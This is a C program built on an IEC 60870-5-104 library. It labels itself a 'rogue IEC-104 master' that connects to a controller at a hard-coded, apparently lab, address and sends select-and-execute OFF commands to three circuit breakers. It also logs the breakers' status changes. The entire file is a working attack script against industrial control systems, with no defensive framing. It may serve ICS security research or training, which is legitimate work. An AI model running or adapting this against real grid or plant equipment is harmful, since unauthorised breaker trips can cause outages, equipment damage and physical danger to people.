#include "cs104_connection.h"
#include "hal_thread.h"
#include "hal_time.h"

#include <stdio.h>
#include <stdlib.h>

#define BREAKER_COUNT 3

static int breaker_ioas[BREAKER_COUNT] = {1001, 1002, 1003};
static int breaker_state[BREAKER_COUNT] = {-1, -1, -1};

static int running = 1;

/* ---------------- helpers ---------------- */

static int findBreakerIndex(int ioa)
{
    for (int i = 0; i < BREAKER_COUNT; i++) {
        if (breaker_ioas[i] == ioa)
            return i;
    }
    return -1;
}

/* ---------------- connection handler ---------------- */

static void
connectionHandler(void* parameter, CS104_Connection connection, CS104_ConnectionEvent event)
{
    switch (event) {
        case CS104_CONNECTION_OPENED:
            printf("[+] Connection established\n");
            break;
        case CS104_CONNECTION_CLOSED:
            printf("[-] Connection closed\n");
            running = 0;
            break;
        case CS104_CONNECTION_FAILED:
            printf("[-] Connection failed\n");
            running = 0;
            break;
        default:
            break;
    }
}

/* ---------------- ASDU handler ---------------- */

static bool
asduHandler(void* parameter, int address, CS101_ASDU asdu)
{
    TypeID type = CS101_ASDU_getTypeID(asdu);

    /* Log breaker status */
    if (type == M_SP_NA_1) {

        for (int i = 0; i < CS101_ASDU_getNumberOfElements(asdu); i++) {

            SinglePointInformation spi =
                (SinglePointInformation) CS101_ASDU_getElement(asdu, i);

            int ioa = InformationObject_getObjectAddress((InformationObject) spi);
            int val = SinglePointInformation_getValue(spi);

            int idx = findBreakerIndex(ioa);
            if (idx >= 0 && breaker_state[idx] != val) {
                printf("[BRK] IOA %d changed: %d -> %d\n",
                       ioa, breaker_state[idx], val);
                breaker_state[idx] = val;
            }

            InformationObject_destroy((InformationObject) spi);
        }
        return true;
    }

    /* Log control confirmations */
    if (type == C_SC_NA_1) {
        CS101_CauseOfTransmission cot = CS101_ASDU_getCOT(asdu);
        bool neg = CS101_ASDU_isNegative(asdu);

        InformationObject io =
            (InformationObject) CS101_ASDU_getElement(asdu, 0);

        int ioa = InformationObject_getObjectAddress(io);

        printf("[CTRL] SELECT response for IOA %d | COT=%d | negative=%d\n",
               ioa, cot, neg ? 1 : 0);

        InformationObject_destroy(io);
        return true;
    }

    return true;
}

/* ---------------- SELECT operation ---------------- */

static void
sendSelect(CS104_Connection con, int ca, int ioa, bool desiredOn)
{
    InformationObject sc =
        (InformationObject) SingleCommand_create(
            NULL,
            ioa,
            desiredOn,  /* desired state */
            true,       /* SELECT = true */
            0
        );

    printf("[SEL] Sending SELECT for IOA %d (state=%d)\n",
           ioa, desiredOn ? 1 : 0);

    CS104_Connection_sendProcessCommandEx(
        con,
        CS101_COT_ACTIVATION,
        ca,
        sc
    );

    InformationObject_destroy(sc);
}

/* ---------------- EXECUTE operation ---------------- */

static void
sendExecute(CS104_Connection con, int ca, int ioa, bool desiredOn)
{
    InformationObject sc =
        (InformationObject) SingleCommand_create(
            NULL,
            ioa,
            desiredOn,   /* must match SELECT */
            false,       /* EXECUTE */
            0
        );

    printf("[EXE] Sending EXECUTE for IOA %d (state=%d)\n",
           ioa, desiredOn ? 1 : 0);

    CS104_Connection_sendProcessCommandEx(
        con,
        CS101_COT_ACTIVATION,
        ca,
        sc
    );

    InformationObject_destroy(sc);
}


/* ---------------- main ---------------- */

int main(void)
{
    const char* ip = "172.30.0.2";
    int port = 2404;
    int commonAddress = 65535;   /* match your server */

    printf("[*]Rogue IEC-104 master - turn off breakers\n");
    printf("[*] Breakers: 1001, 1002, 1003\n");

    CS104_Connection con = CS104_Connection_create(ip, port);
    CS104_Connection_setConnectionHandler(con, connectionHandler, NULL);
    CS104_Connection_setASDUReceivedHandler(con, asduHandler, NULL);

    if (!CS104_Connection_connect(con)) {
        printf("[-] Failed to connect\n");
        return -1;
    }

    CS104_Connection_sendStartDT(con);

    Thread_sleep(1000);

    /* -------- SELECT and EXECUTE phase -------- */
    for (int i = 0; i < BREAKER_COUNT; i++) {
        sendSelect(con, commonAddress, breaker_ioas[i], false);
        Thread_sleep(300); 
        sendExecute(con, commonAddress, breaker_ioas[i], false);
        Thread_sleep(5000);
    }

    CS104_Connection_destroy(con);
    return 0;
}
